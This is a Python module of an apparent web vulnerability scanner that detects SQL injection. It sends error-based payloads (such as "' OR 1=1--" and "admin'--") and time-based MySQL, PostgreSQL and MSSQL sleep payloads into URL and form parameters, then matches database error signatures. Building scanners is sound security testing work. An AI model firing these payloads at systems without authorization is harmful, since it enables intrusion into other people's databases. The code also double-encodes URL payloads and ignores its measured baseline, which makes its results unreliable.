#!/usr/bin/env python3
"""
SQL Injection Detector (Error-based + Time-based)
"""

from typing import Dict, Any, Optional, List
from urllib.parse import quote, urlencode
import time
import re

from .base import BaseDetector


class SQLIDetector(BaseDetector):
    def __init__(self, http_client, console):
        super().__init__(http_client, console)
        self.error_payloads = self._get_error_payloads()
        self.time_payloads = self._get_time_payloads()
        self.error_signatures = self._get_error_signatures()
    
    def _get_error_payloads(self):
        return [
            "'",
            '"',
            "1'",
            "1' OR '1'='1",
            "1' OR 1=1--",
            "1' AND '1'='1",
            "1' AND 1=1--",
            "' OR '1'='1' /*",
            "admin'--",
        ]
    
    def _get_time_payloads(self):
        return [
            {'payload': "1' AND SLEEP(3)--", 'db': 'MySQL', 'delay': 3},
            {'payload': "1'; SELECT pg_sleep(3);--", 'db': 'PostgreSQL', 'delay': 3},
            {'payload': "1'; WAITFOR DELAY '00:00:03';--", 'db': 'MSSQL', 'delay': 3},
        ]
    
    def _get_error_signatures(self):
        return {
            'MySQL': [
                'SQL syntax.*MySQL',
                'mysql_fetch_',
                'MySQLSyntaxErrorException',
                'valid MySQL result',
                'check the manual.*MySQL',
            ],
            'PostgreSQL': [
                'PostgreSQL.*ERROR',
                'pg_query',
                'valid PostgreSQL result',
            ],
            'MSSQL': [
                'SQL Server',
                'Driver.*SQL Server',
                'Unclosed quotation mark',
                'Incorrect syntax near',
            ],
            'Oracle': [
                'ORA-[0-9]{5}',
                'Oracle.*Driver',
            ],
            'SQLite': [
                'SQLite/JDBCDriver',
                'sqlite3.',
                'SQL logic error',
            ],
        }
    
    def get_payloads(self):
        return self.error_payloads
    
    def detect(self, target: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        vuln = self._test_error_based(target)
        if vuln:
            return vuln
        
        vuln = self._test_time_based(target)
        if vuln:
            return vuln
        
        return None
    
    def _test_error_based(self, target):
        if target['type'] == 'url':
            return self._test_url_error(target)
        elif target['type'] == 'form':
            return self._test_form_error(target)
        return None
    
    def _test_url_error(self, target):
        url = target['url']
        
        for param in target['params']:
            param_name = param['name']
            
            for payload in self.error_payloads:
                encoded_payload = quote(payload)
                
                test_params = {}
                for p in target['params']:
                    if p['name'] == param_name:
                        test_params[p['name']] = encoded_payload
                    else:
                        test_params[p['name']] = p['value']
                
                test_url = f"{url}?{urlencode(test_params)}"
                
                try:
                    response = self.http.get(test_url)
                    
                    if response and response.text:
                        if self._has_sql_error(response.text):
                            db_type = self._identify_database(response.text)
                            return self.create_vulnerability(
                                target=target,
                                payload=payload,
                                evidence=f"Database: {db_type} - {response.text[:200]}",
                                severity='critical',
                                param_name=param_name
                            )
                except:
                    continue
        
        return None
    
    def _test_form_error(self, target):
        action = target['action']
        method = target['method']
        
        for field in target['params']:
            field_name = field['name']
            
            for payload in self.error_payloads:
                form_data = {}
                for f in target['params']:
                    if f['name'] == field_name:
                        form_data[f['name']] = payload
                    else:
                        form_data[f['name']] = f.get('value', 'test')
                
                try:
                    if method == 'POST':
                        response = self.http.post(action, data=form_data)
                    else:
                        response = self.http.get(action, params=form_data)
                    
                    if response and response.text:
                        if self._has_sql_error(response.text):
                            db_type = self._identify_database(response.text)
                            return self.create_vulnerability(
                                target=target,
                                payload=payload,
                                evidence=f"Database: {db_type} - {response.text[:200]}",
                                severity='critical',
                                param_name=field_name
                            )
                except:
                    continue
        
        return None
    
    def _test_time_based(self, target):
        if target['type'] != 'url':
            return None
        
        url = target['url']
        baseline = self._get_baseline_time(url, target['params'])
        
        for param in target['params']:
            param_name = param['name']
            
            for time_payload in self.time_payloads:
                payload = time_payload['payload']
                expected_delay = time_payload['delay']
                db_type = time_payload['db']
                
                encoded_payload = quote(payload)
                
                test_params = {}
                for p in target['params']:
                    if p['name'] == param_name:
                        test_params[p['name']] = encoded_payload
                    else:
                        test_params[p['name']] = p['value']
                
                test_url = f"{url}?{urlencode(test_params)}"
                
                try:
                    start = time.time()
                    response = self.http.get(test_url)
                    duration = time.time() - start
                    
                    if duration >= expected_delay:
                        return self.create_vulnerability(
                            target=target,
                            payload=payload,
                            evidence=f"Time-based blind SQLi ({db_type}): {duration:.2f}s vs baseline {baseline:.2f}s",
                            severity='critical',
                            param_name=param_name
                        )
                except:
                    continue
        
        return None
    
    def _get_baseline_time(self, url, params):
        try:
            start = time.time()
            test_url = f"{url}?{urlencode({p['name']: p['value'] for p in params})}"
            self.http.get(test_url)
            return time.time() - start
        except:
            return 0.3
    
    def _has_sql_error(self, text):
        for db_type, signatures in self.error_signatures.items():
            for signature in signatures:
                if re.search(signature, text, re.IGNORECASE):
                    return True
        return False
    
    def _identify_database(self, text):
        for db_type, signatures in self.error_signatures.items():
            for signature in signatures:
                if re.search(signature, text, re.IGNORECASE):
                    return db_type
        return 'Unknown'